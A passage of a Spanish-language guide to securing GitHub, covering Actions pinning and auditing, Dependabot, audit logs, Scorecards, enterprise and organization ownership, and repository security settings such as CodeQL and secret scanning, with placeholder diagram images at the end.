> actualmente la única forma de utilizar una acción como un lanzamiento
> inmutable. Fijar las acciones a un SHA en particular ayuda a mitigar
> el riesgo de que un actor malintencionado agregue una puerta trasera
> al repositorio de la acción, ya que necesitan generar una colisión de
> SHA-1 para una carga útil válida de un objeto de Git. Al seleccionar
> un SHA, debe comprobar que se encuentra en el repositorio de la acción
> y no en una bifurcación de repositorio.

-   **Auditar el código fuente de la acción**

> Asegúrate de que la acción está manejando los secretos y el contenido
> de tu repositorio como se espera. Por ejemplo, verifica que los
> secretos no se envíen a hosts no deseados, o que no se registren
> inadvertidamente.

-   **Anclar las acciones a una etiqueta únicamente si confía en el
    > creador**

> Aunque fijar el SHA de una confirmación es la opción más segura,
> especificar una etiqueta es más conveniente y se utiliza ampliamente.
> Si te gustaría especificar una etiqueta, entonces asegúrate de que
> confías en los creadores de la acción. La insignia de 'Verified
> creator' en GitHub Marketplace es una señal útil, ya que te indica que
> la acción viene de un equipo cuya identidad verificó GitHub. Nota que
> este acercamiento sí tiene riesgos aún si confías en el autor, ya que
> una etiqueta se puede mover o borrar en caso de que un actor malicioso
> consiga acceso al repositorio que almacena la acción.

# **Reutilizar los flujos de trabajo de terceros**

El mismo principio que se describió anteriormente para utilizar acciones
de terceros también aplica para los flujos de trabajo de terceros.
Puedes ayudar a mitigar los riesgos asociados con la reutilización de
flujos de trabajo si sigues las mismas buenas prácticas que se describen
anteriormente.

# **El uso de Dependabot version updates mantiene actualizadas las dependencias**

Puedes usar Dependabot version updates para asegurarte de que las
referencias a las acciones y los flujos de trabajo reutilizables usados
en el repositorio se mantienen actualizados. Las acciones a menudo se
actualizan con correcciones de errores y con nuevas características para
que los procesos automatizados sean más confiables, rápidos y seguros.
Dependabot version updates acaba con la necesidad de mantener las
dependencias, ya que Dependabot lo hace automáticamente.

# **Impedir que GitHub Actions de cree o apruebe solicitudes de incorporación de cambios**

Puedes elegir si permitir o impedir que los flujos de trabajo de GitHub
Actions creen o aprueben las solicitudes de incorporación de cambios.
Permitir que los flujos de trabajo, o cualquier otra automatización,
creen o aprueben solicitudes de incorporación de cambios podría ser un
riesgo de seguridad si la solicitud de incorporación de cambios se
combina sin la supervisión adecuada.

# **Auditar eventos de GitHub Actions**

Puedes usar el registro de seguridad para supervisar la actividad de tu
cuenta de usuario y el registro de auditoría para supervisar la
actividad en tu organización. El registro de seguridad y auditoría
registra el tipo de acción, cuándo se ejecutó, y qué cuenta personal
llevó a cabo la acción.

Por ejemplo, puedes usar el registro de auditoría para realizar un
seguimiento del evento org.update_actions_secret, que realiza un
seguimiento de los cambios en los secretos de la organización.

![](media/image5.png)

# **Utilizar las tarjetas de puntuación para asegurar los flujos de trabajo**

Los cuadros de mandos son una herramienta de seguridad automatizada que
marca las prácticas de riesgo en la cadena de suministro. Puede usar la
acción de cuadros de mandos y el flujo de trabajo de inicio para seguir
las prácticas de seguridad recomendadas. Una vez que se configure, la
acción de tarjetas de puntuación se ejecutará automáticamente en los
cambios de repositorio y alertará a los desarrolladores sobre las
prácticas riesgosas en la cadena de suministro utilizando la experiencia
de escaneo en el código integrado. El proyecto de tarjetas de puntuación
ejecuta varias verificaciones, incluyendo las de ataques de inyección de
scripts, permisos de tokens y acciones fijadas.

# **Seguridad para empresas**

# **Asignar varios propietarios**

Si una empresa sólo tiene un propietario, los recursos de la empresa
pueden volverse inaccesibles si el propietario es inalcanzable. Para
proteger el acceso a sus recursos, recomendamos que al menos dos
personas dentro de la empresa tengan la función de propietario.

# **Identifique el mejor método de autenticación para su empresa**

Puede permitir que las personas usen una cuenta personal en GitHub.com
para acceder a los recursos de su empresa y, opcionalmente, configurar
restricciones de acceso SAML adicionales, o puede aprovisionar y
controlar las cuentas de su empresa utilizando su proveedor de identidad
(IdP) con Usuarios administrados empresariales.

# **Usar políticas**

Recomendamos utilizar políticas para hacer cumplir las reglas
comerciales y el cumplimiento normativo.

Cada política empresarial controla las opciones disponibles para una
política a nivel de organización. Puede optar por no aplicar una
política, lo que permite a los propietarios de la organización
configurar la política para la organización, o puede elegir entre un
conjunto de opciones para aplicarla en todas las organizaciones
propiedad de su empresa.

# **Minimizar el número de organizaciones.**

La mayoría de las empresas funcionan mejor con una sola organización.
Algunas empresas pueden necesitar varias organizaciones por motivos de
cumplimiento o seguridad, pero intente crear la menor cantidad posible.
Un número menor de organizaciones fomenta la práctica de recursos
internos, permite que las discusiones involucren a una audiencia más
amplia y reduce los gastos administrativos.

# **Evite una colaboración extensa en repositorios propiedad de los usuarios**

Recomendamos colaborar en repositorios propiedad de la organización
siempre que sea posible y minimizar la colaboración en repositorios
propiedad de los usuarios. Los repositorios propiedad de la organización
tienen características administrativas y de seguridad más sofisticadas y
permanecen accesibles incluso cuando cambia la membresía empresarial.

# **Utilice nombres de usuario legibles por humanos**

Si controla los nombres de usuario de los miembros de la empresa,
utilice nombres de usuario legibles por humanos y evite identificaciones
generadas por máquinas que sean difíciles de leer para los humanos.

Puede administrar la visualización de nombres de usuario dentro de los
repositorios privados de su empresa

# **Seguridad para repositorios**

## **Introducción**

Esta guía le muestra cómo configurar funciones de seguridad para un
repositorio. Debe ser administrador del repositorio o propietario de la
organización para configurar los ajustes de seguridad de un repositorio.

Sus necesidades de seguridad son exclusivas de su repositorio, por lo
que es posible que no necesite habilitar todas las funciones de su
repositorio.

Algunas funciones están disponibles para repositorios en todos los
planes. Hay funciones adicionales disponibles para empresas que utilizan
GitHub Advanced Security. Las funciones de GitHub Advanced Security
también están habilitadas para todos los repositorios públicos en
GitHub.com.

## **Administrar el acceso a su repositorio**

El primer paso para proteger un repositorio es establecer quién puede
ver y modificar su código.

Desde la página principal de su repositorio, haga clic en Configuración
y luego desplácese hacia abajo hasta la \"Zona de peligro\".

1.  Para cambiar quién puede ver su repositorio, haga clic en Cambiar
    > visibilidad .

2.  Para cambiar quién puede acceder a su repositorio y ajustar los
    > permisos, haga clic en Administrar acceso

## **Gestionar el gráfico de dependencia**

El gráfico de dependencia se genera automáticamente para todos los
repositorios públicos. Puede optar por habilitarlo para bifurcaciones y
repositorios privados. El gráfico de dependencia interpreta archivos de
manifiesto y bloqueo en un repositorio para identificar dependencias.

1.  Desde la página principal de su repositorio, haga clic en
    > Configuración .

2.  Haga clic en Seguridad y análisis .

3.  Junto al gráfico de dependencia, haga clic en Activar o Desactivar .

## **Administrar alertas de Dependabot**

Las alertas de Dependabot se generan cuando GitHub identifica una
dependencia en el gráfico de dependencia con una vulnerabilidad. Puede
habilitar las alertas de Dependabot para cualquier repositorio.

Además, puede usar las reglas de clasificación automática de Dependabot
para administrar sus alertas a escala, de modo que pueda descartar o
posponer alertas automáticamente y especificar para qué alertas desea
que Dependabot abra solicitudes de extracción.

1.  Haga clic en su foto de perfil, luego haga clic en Configuración .

2.  Haga clic en Seguridad y análisis .

3.  Haga clic en Habilitar todo junto a Alertas de Dependabot.

## **Gestión de la revisión de dependencia**

La revisión de dependencia le permite visualizar los cambios de
dependencia en las solicitudes de extracción antes de que se fusionen en
sus repositorios.

La revisión de dependencias es una característica de Seguridad avanzada
de GitHub. La revisión de dependencia ya está habilitada para todos los
repositorios públicos. Para habilitar la revisión de dependencia para un
repositorio privado o interno, asegúrese de que el gráfico de
dependencia esté habilitado y habilite GitHub Advanced Security.

1.  Desde la página principal de su repositorio, haga clic en
    > Configuración .

2.  Haga clic en Seguridad y análisis .

3.  Si el gráfico de dependencia aún no está habilitado, haga clic en
    > Habilitar .

4.  Si GitHub Advanced Security aún no está habilitado, haga clic en
    > Habilitar .

## **Administrar las actualizaciones de seguridad del Dependabot**

Para cualquier repositorio que utilice alertas de Dependabot, puede
habilitar las actualizaciones de seguridad de Dependabot para generar
solicitudes de extracción (pull request) con actualizaciones de
seguridad cuando se detecten vulnerabilidades.

1.  Desde la página principal de su repositorio, haga clic en
    > Configuración .

2.  Haga clic en Seguridad y análisis .

3.  Junto a Actualizaciones de seguridad de Dependabot, haga clic en
    > Habilitar .

## **Administrar actualizaciones de versiones de Dependabot**

Puede habilitar Dependabot para que genere automáticamente solicitudes
de extracción para mantener sus dependencias actualizadas.

1.  Desde la página principal de su repositorio, haga clic en
    > Configuración .

2.  Haga clic en Seguridad y análisis .

3.  Junto a las actualizaciones de la versión de Dependabot, haga clic
    > en Habilitar para crear un archivo dependabot.yml de configuración
    > básica.

4.  Especifique las dependencias que desea actualizar y las opciones de
    > configuración asociadas, luego envíe el archivo al repositorio.

## **Configurar el escaneo de código**

Puede configurar el escaneo de código para identificar automáticamente
vulnerabilidades y errores en el código almacenado en su repositorio
mediante el uso de un flujo de trabajo de análisis CodeQL o una
herramienta de terceros. Dependiendo de los lenguajes de programación en
su repositorio, puede configurar el escaneo de código con CodeQL usando
la configuración predeterminada, en la que GitHub determina
automáticamente los idiomas a escanear, los conjuntos de consultas a
ejecutar y los eventos que desencadenaron un nuevo escaneo.

1.  Desde la página principal de su repositorio, haga clic en
    > Configuración .

2.  En la sección \"Seguridad\" de la barra lateral, haga clic en
    > Análisis y seguridad del código .

3.  En la sección \"Escaneo de código\", seleccione Configurar y luego
    > haga clic en \"Predeterminado" .

4.  En la ventana emergente que aparece, revise la configuración
    > predeterminada para su repositorio y luego haga clic en Habilitar
    > CodeQL .

Alternativamente, puede usar la configuración avanzada, que genera un
archivo de flujo de trabajo que puede editar para personalizar el
escaneo de código con CodeQL.

El escaneo de código está disponible para todos los repositorios
públicos y para repositorios privados propiedad de organizaciones que
forman parte de una empresa con una licencia de GitHub Advanced
Security.

## **Configurar el escaneo secreto**

Las alertas de escaneo de secretos para socios se ejecutan
automáticamente en repositorios públicos y paquetes npm públicos para
notificar a los proveedores de servicios sobre secretos filtrados en
GitHub.com.

Las alertas de escaneo secreto para los usuarios están disponibles de
forma gratuita en todos los repositorios públicos. Las organizaciones
que utilizan GitHub Enterprise Cloud con una licencia para GitHub
Advanced Security también pueden habilitar alertas de escaneo secreto
para los usuarios en sus repositorios privados e internos.

1.  Desde la página principal de su repositorio, haga clic en
    > Configuración .

2.  Haga clic en Seguridad y análisis del código .

3.  Si GitHub Advanced Security aún no está habilitado, haga clic en
    > Habilitar .

4.  Junto a Escaneo secreto, haga clic en Habilitar .

## **Establecer una política de seguridad**

Si es mantenedor de un repositorio, es una buena práctica especificar
una política de seguridad para su repositorio creando un archivo
nombrado SECURITY.md en el repositorio. Este archivo indica a los
usuarios cómo comunicarse mejor con usted y colaborar con usted cuando
quieran informar vulnerabilidades de seguridad en su repositorio. Puede
ver la política de seguridad de un repositorio desde la pestaña
Seguridad del repositorio .

1.  Desde la página principal de su repositorio, haga clic en Seguridad
    > .

2.  Haga clic en Política de seguridad .

3.  Haga clic en Iniciar configuración .

4.  Agregue información sobre las versiones compatibles de su proyecto y
    > cómo informar vulnerabilidades.

# **Seguridad para organizaciones**

# **Asignar varios propietarios**

Si una organización solo tiene un propietario, los proyectos de la
organización pueden volverse inaccesibles si el propietario es
inaccesible. Para garantizar que nadie pierda el acceso a un proyecto,
recomendamos que al menos dos personas dentro de cada organización
tengan el rol de propietario.

# **Usar equipos (teams)**

Recomendamos utilizar equipos para facilitar la colaboración en su
organización y administrar la membresía del equipo a través de su
proveedor de identidad (IdP).

-   Nota : si su empresa utiliza usuarios administrados empresariales,
    > no necesita utilizar la sincronización del equipo. En su lugar,
    > puede administrar la membresía del equipo a través de la
    > configuración SCIM que creó al configurar su empresa. Para obtener
    > más información, consulte \" Administrar membresías de equipos con
    > grupos de proveedores de identidad \".

Recomendamos mantener los equipos visibles siempre que sea posible y
reservar equipos secretos para situaciones delicadas.

# **Usar descripción general de seguridad**

La descripción general de seguridad proporciona resúmenes de alto nivel
del panorama de seguridad de una organización o empresa y facilita la
identificación de repositorios que requieren intervención. También puede
utilizar la descripción general de seguridad para ver qué repositorios
han habilitado funciones de seguridad específicas y configurar cualquier
función de seguridad disponible que no esté en uso actualmente.

# **Diagramas AS-IS y TO-BE para multiple tecnologías**

## **Diagrama AS-IS**

## ![](media/image6.png)

## 

## **Diagrama TO-BE**

![](media/image7.png) 
  